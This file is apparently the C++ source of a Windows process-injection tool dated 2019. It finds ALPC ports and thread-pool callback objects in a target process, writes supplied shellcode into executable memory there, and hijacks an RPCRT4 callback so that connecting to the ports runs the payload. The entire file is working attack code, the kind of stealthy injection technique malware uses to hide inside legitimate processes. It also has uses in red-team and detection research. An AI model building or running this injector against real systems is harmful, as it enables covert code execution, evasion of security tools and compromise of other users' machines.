/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#include "../NTlib/util.h"

#include <cstdio>
#include <vector>
#include <string>

typedef struct _process_info_t {
  DWORD                     pid;             // process id
  PWCHAR                    name;            // name of process
  HANDLE                    hp;              // handle of open process
  LPVOID                    payload;         // pointer to shellcode
  DWORD                     payloadSize;     // size of shellcode
  std::vector<std::wstring> ports;           // alpc ports
} process_info;

#define MAX_BUFSIZ            8192
#define INFO_HANDLE_ALPC_PORT 45 // only for Windows 10. probably differs for other systems

/**
  Get a list of ALPC ports with names
*/
DWORD GetALPCPorts(process_info *pi) 
{    
    ULONG                      len=0, total=0;
    NTSTATUS                   status;
    LPVOID                     list=NULL;    
    DWORD                      i;
    HANDLE                     hObj;
    PSYSTEM_HANDLE_INFORMATION hl;
    POBJECT_NAME_INFORMATION   objName;
    
    pi->ports.clear();
    
    // get a list of handles for the local system
    for(len=MAX_BUFSIZ;;len+=MAX_BUFSIZ) {
      list = xmalloc(len);
      status = NtQuerySystemInformation(
          SystemHandleInformation, list, len, &total);
      // break from loop if ok    
      if(NT_SUCCESS(status)) break;
      // free list and continue
      xfree(list);   
    }
    
    hl      = (PSYSTEM_HANDLE_INFORMATION)list;
    objName = (POBJECT_NAME_INFORMATION)xmalloc(8192);
    
    // for each handle
    for(i=0; i<hl->NumberOfHandles; i++) {
      // skip if process ids don't match
      if(hl->Handles[i].UniqueProcessId != pi->pid) continue;

      // skip if the type isn't an ALPC port
      // note this value might be different on other systems.
      // this was tested on 64-bit Windows 10
      if(hl->Handles[i].ObjectTypeIndex != 45) continue;
      
      // duplicate the handle object
      status = NtDuplicateObject(
            pi->hp, (HANDLE)hl->Handles[i].HandleValue, 
            GetCurrentProcess(), &hObj, 0, 0, 0);
            
      // continue with next entry if we failed
      if(!NT_SUCCESS(status)) continue;
      
      // try query the name
      status = NtQueryObject(hObj, 
          ObjectNameInformation, objName, 8192, NULL);
      
      // got it okay?
      if(NT_SUCCESS(status) && objName->Name.Buffer!=NULL) {
        // save to list
        pi->ports.push_back(objName->Name.Buffer);
      }
      // close handle object
      NtClose(hObj); 
    }
    // free list of handles
    xfree(objName);
    xfree(list);
    return pi->ports.size();
}

// connect to ALPC port
BOOL ALPC_Connect(std::wstring path) {
    SECURITY_QUALITY_OF_SERVICE ss;
    NTSTATUS                    status;
    UNICODE_STRING              server;
    ULONG                       MsgLen=0;
    HANDLE                      h;
    
    ZeroMemory(&ss, sizeof(ss));
    ss.Length              = sizeof(ss);
    ss.ImpersonationLevel  = SecurityImpersonation;
    ss.EffectiveOnly       = FALSE;
    ss.ContextTrackingMode = SECURITY_DYNAMIC_TRACKING;

    RtlInitUnicodeString(&server, path.c_str());
    
    status = NtConnectPort(&h, &server, &ss, NULL, 
      NULL, (PULONG)&MsgLen, NULL, NULL);
      
    NtClose(h);
    
    return NT_SUCCESS(status);
}
    
// try inject and run payload in remote process using TCO
BOOL ALPC_deploy(process_info *pi, LPVOID ds, PTP_CALLBACK_OBJECT tco) {
    LPVOID             cs = NULL;
    BOOL               bInject = FALSE;
    TP_CALLBACK_OBJECT cpy;    // local copy of tco
    SIZE_T             wr;
    TP_SIMPLE_CALLBACK tp;
    DWORD              i;
    
    // allocate memory in remote for payload and callback parameter
    cs = VirtualAllocEx(pi->hp, NULL, 
      pi->payloadSize + sizeof(TP_SIMPLE_CALLBACK), 
      MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            
    if (cs != NULL) {
        // write payload to remote process
        WriteProcessMemory(pi->hp, cs, pi->payload, pi->payloadSize, &wr);
        // backup TCO
        CopyMemory(&cpy, tco, sizeof(TP_CALLBACK_OBJECT));
        // copy original callback address and parameter
        tp.Function = cpy.Callback.Function;
        tp.Context  = cpy.Callback.Context;
        // write callback+parameter to remote process
        WriteProcessMemory(pi->hp, (LPBYTE)cs + pi->payloadSize, &tp, sizeof(tp), &wr);
        // update original callback with address of payload and parameter
        cpy.Callback.Function = cs;
        cpy.Callback.Context  = (LPBYTE)cs + pi->payloadSize;
        // update TCO in remote process
        WriteProcessMemory(pi->hp, ds, &cpy, sizeof(cpy), &wr);
        // trigger execution of payload
        for(i=0;i<pi->ports.size(); i++) {
          ALPC_Connect(pi->ports[i]);
          // read back the TCO
          ReadProcessMemory(pi->hp, ds, &cpy, sizeof(cpy), &wr);
          // if callback pointer is the original, we succeeded.
          bInject = (cpy.Callback.Function == tco->Callback.Function);
          if(bInject) break;
        }
        // restore the original tco
        WriteProcessMemory(pi->hp, ds, tco, sizeof(cpy), &wr);
        // release memory for payload
        VirtualFreeEx(pi->hp, cs, 
          pi->payloadSize+sizeof(tp), MEM_RELEASE);
    }
    return bInject;
}

// validates a callback object
BOOL IsValidTCO(HANDLE hProcess, PTP_CALLBACK_OBJECT tco) {
    MEMORY_BASIC_INFORMATION mbi;
    SIZE_T                   res;
    
    // if it's a callback, these values shouldn't be empty  
    if(tco->CleanupGroupMember     == NULL ||
       tco->Pool                   == NULL ||
       tco->CallerAddress.Function == NULL ||
       tco->Callback.Function      == NULL) return FALSE;

    // the CleanupGroupMember should reside in read-only
    // area of image
    res = VirtualQueryEx(hProcess, 
      (LPVOID)tco->CleanupGroupMember, &mbi, sizeof(mbi));
      
    if (res != sizeof(mbi)) return FALSE;
    if (!(mbi.Protect & PAGE_READONLY)) return FALSE;
    if (!(mbi.Type & MEM_IMAGE)) return FALSE;
    
    // the pool object should reside in read+write memory
    res = VirtualQueryEx(hProcess, 
      (LPVOID)tco->Pool, &mbi, sizeof(mbi));
      
    if (res != sizeof(mbi)) return FALSE;
    if (!(mbi.Protect & PAGE_READWRITE)) return FALSE;

    // the caller function should reside in read+executable memory
    res = VirtualQueryEx(hProcess, 
      (LPCVOID)tco->CallerAddress.Function, &mbi, sizeof(mbi));
      
    if (res != sizeof(mbi)) return FALSE;
    if (!(mbi.Protect & PAGE_EXECUTE_READ)) return FALSE;
    
    // the callback function should reside in read+executable memory
    res = VirtualQueryEx(hProcess, 
      (LPCVOID)tco->Callback.Function, &mbi, sizeof(mbi));
      
    if (res != sizeof(mbi)) return FALSE;
    return (mbi.Protect & PAGE_EXECUTE_READ);    
}

BOOL FindEnviron(process_info *pi, LPVOID BaseAddress, SIZE_T RegionSize) 
{
    LPBYTE               addr = (LPBYTE)BaseAddress;
    SIZE_T               pos;
    BOOL                 bRead, bFound,bInject=FALSE;
    SIZE_T               rd;
    TP_CALLBACK_OBJECT tco;
    WCHAR                filename[MAX_PATH];
    
    // scan memory for TCO
    for(pos=0; pos<RegionSize; 
      pos += (bFound ? sizeof(TP_CALLBACK_OBJECT) : sizeof(ULONG_PTR))) 
    {
      bFound = FALSE;
      // try read TCO from writeable memory
      bRead = ReadProcessMemory(pi->hp,
        &addr[pos], &tco, sizeof(TP_CALLBACK_OBJECT), &rd);

      // if not read, continue
      if(!bRead) continue;
      // if not size of callback environ, continue
      if(rd != sizeof(TP_CALLBACK_OBJECT)) continue;
      
      // is this a valid TCO?
      bFound=IsValidTCO(pi->hp, &tco);
      if(bFound) {
        // obtain module name where callback resides
        GetMappedFileName(pi->hp, (LPVOID)tco.Callback.Function, filename, MAX_PATH);
        // filter by RPCRT4.dll
        if(StrStrI(filename, L"RPCRT4.dll")!=NULL) {
          wprintf(L"Found TCO at %p for %s\n",  addr+pos, filename);
          // try run payload using this TCO
          // if successful, end scan
          bInject = ALPC_deploy(pi, addr+pos, &tco);
          if (bInject) break;
        }
      }
    }
    return bInject;
}

BOOL ALPC_inject(process_info *pi) {
    SYSTEM_INFO              si;
    MEMORY_BASIC_INFORMATION mbi;
    LPBYTE                   addr;     // current address
    SIZE_T                   res;
    BOOL                     bInject=FALSE;
    
    // try open the target process. return on error
    pi->hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pi->pid);
    if(pi->hp==NULL) return FALSE;

    // obtain a list of ALPC ports. return if none found
    if(!GetALPCPorts(pi)) {
      CloseHandle(pi->hp);
      return FALSE;
    }

    // get memory info
    GetSystemInfo(&si);
    
    // scan virtual memory for this process upto maximum address available    
    for (addr=0; addr<(LPBYTE)si.lpMaximumApplicationAddress;) 
    {
      res = VirtualQueryEx(pi->hp, addr, &mbi, sizeof(mbi));

      // we only want to scan the heap, 
      // but this will scan stack space too.
      // need to fix that..
      if ((mbi.State   == MEM_COMMIT)  &&
          (mbi.Type    == MEM_PRIVATE) && 
          (mbi.Protect == PAGE_READWRITE)) 
      {
        bInject = FindEnviron(pi, mbi.BaseAddress, mbi.RegionSize);
        if(bInject) break;
      }
      // update address to query
      addr = (PBYTE)mbi.BaseAddress + mbi.RegionSize;
    }
    CloseHandle(pi->hp);
    return bInject;
}

int main(void) {
    PWCHAR       *argv;
    int          argc;
    process_info pi;
    
    // get parameters
    argv = CommandLineToArgvW(GetCommandLine(), &argc);
    
    if (argc != 3) {
      wprintf(L"usage: alpc <payload> <process id | process name>\n");
      return 0;
    }
    
    if(!SetPrivilege(SE_DEBUG_NAME, TRUE)) {
      wprintf(L"can't enable debug privilege.\n");
    }
    
    // try read pic
    pi.payloadSize = readpic(argv[1], &pi.payload);
    
    if(pi.payloadSize == 0) { 
      wprintf(L"[-] Unable to read PIC from %s\n", argv[1]); 
      return 0; 
    }

    pi.pid=name2pid(argv[2]);
    
    if(pi.pid==0) pi.pid=_wtoi(argv[2]);
    if(pi.pid==0) { 
      wprintf(L"unable to obtain process id for %s\n", argv[2]);
      return 0;
    }
    wprintf(L"ALPC injection : %s\n", 
      ALPC_inject(&pi) ? L"OK" : L"FAILED");
    return 0;
}

